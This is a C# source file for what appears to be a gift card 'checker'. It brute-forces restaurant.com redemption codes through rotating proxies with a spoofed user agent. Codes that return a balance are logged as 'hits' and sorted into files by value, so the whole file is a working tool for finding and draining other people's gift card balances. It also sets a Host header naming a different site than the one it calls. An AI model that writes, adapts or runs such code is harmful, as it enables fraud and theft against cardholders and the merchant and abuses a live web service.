using System;
using System.IO;
using System.Threading;
using Leaf.xNet;

namespace Restaurant.Core
{
    public static class Checker
    {
        private static readonly object Locker = new object();
        private static readonly Random Random = new Random();


        public static void Check(string card = null)
        {
            var generatedCard = card ?? Globals.GetRandomCard();
            try
            {
                using var http = new HttpRequest
                {
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(Globals.EProxyType,Globals.Proxies[Random.Next(0, Globals.Proxies.Count - 1)]),
                    ConnectTimeout = Globals.Timeout,
                    UserAgent =
                        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
                };

                http.AddHeader("Pragma", "no-cache");
                http.AddHeader("Host", "api.spirit.com");
                http.AddHeader("Origin", "https://www.restaurant.com");
                http.AddHeader("Accept", "*/*");
                http.AddHeader("Referer", "https://www.restaurant.com/Redemptions");

                var resp = http.Post(
                    "https://www.restaurant.com/redemptions/redeem",
                    $"Code={generatedCard}&HasRedeemedCode=true&Location=75001",
                    "application/x-www-form-urlencoded");
                var text = resp.ToString();
                
                if (text.Contains("\"ResponseCode\":\"Valid\""))
                {
                    lock (Locker)
                    {
                        try
                        {
                            var balanceText = Parse(text, "\"RemainingBalance\":", ",");
                            var balanceDecimal = decimal.Parse(balanceText);
                            
                            var code = Parse(text, "\"Code\":\"", "\",\"Location");
                            var balance = Convert.ToInt32(balanceDecimal);
                            var toSave = $"{code} | Balance = {balance}";

                            Stats.TotalBalance += balance;

                            if (balance < 5)
                            {
                                Stats.Checked++;
                                Custom(toSave);
                                return;
                            }

                            if (balance < 10)
                            {
                                Stats._5++;
                                SaveData(toSave, "5.txt");
                            }
                            else if (balance < 15)
                            {
                                Stats._10++;
                                SaveData(toSave, "10.txt");
                            }
                            else if (balance < 25)
                            {
                                Stats._15++;
                                SaveData(toSave, "15.txt");
                            }
                            else if (balance < 50)
                            {
                                Stats._25++;
                                SaveData(toSave, "25.txt");
                            }
                            else if (balance < 100)
                            {
                                Stats._50++;
                                SaveData(toSave, "50.txt");
                            }
                            else
                            {
                                Stats._100++;
                                SaveData(toSave, "100.txt");
                            }


                            Stats.Working++;
                            SaveData(toSave, "Working");
                            Console.WriteLine($"{Clr.LtGreen}[HIT] Balance: {balance}{Clr.Reset}");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"{Clr.LtRed}[ERROR] Error in saving data: {ex.Message}{Clr.Reset}");
                        }
                    }
                }
                else if (text.Contains("\"ResponseCode\":\"ZeroBalance\"") || text.Contains("\"ResponseCode\":\"NotFound\""))
                {
                    Invalid(generatedCard);
                }
                else
                {
                    Retry(generatedCard);
                    return;
                }

                Stats.Checked++;
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                Retry(generatedCard);
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new[]
            {
                left
            }, StringSplitOptions.None)[1].Split(new[]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static void TitleUpdater()
        {
            while (!Stats.Finished)
            {
                Console.Title =
                    $"Restaurant | Progress: ({Stats.Checked}) - Hits: {Stats.Working} - TotalBalance: {Stats.TotalBalance} - Custom: {Stats.Custom} - Bad: {Stats.Invalid} - Retries: {Stats.Retries} - CPM: {Stats.Cpm}";
                Thread.Sleep(500);
            }
        }

        public static void CpmCounter()
        {
            while (!Stats.Finished)
            {
                var now = Stats.Checked;
                Thread.Sleep(1000);
                Stats.Cpm = (Stats.Checked - now) * 60;
            }
        }

        private static void Invalid(string account)
        {
            lock (Locker)
            {
                Stats.Invalid++;
                if (Globals.OutputBad == 1)
                    Console.WriteLine($"{Clr.LtRed}[BAD] {account}{Clr.Reset}");
            }
        }

        private static void Custom(string data)
        {
            Stats.Custom++;
            SaveData(data, "Custom");
            Console.WriteLine($"{Clr.LtYellow}[Custom] {data}{Clr.Reset}");
        }

        private static void Retry(string account)
        {
            Stats.Retries++;
            Globals.Queue.Add(account);
        }

        private static void SaveData(string data, string fileName)
        {
            var path = $"{Globals.ResultsPath}\\{fileName}.txt";
            using var writer = new StreamWriter(path, true);
            writer.WriteLine(data);
        }
    }
}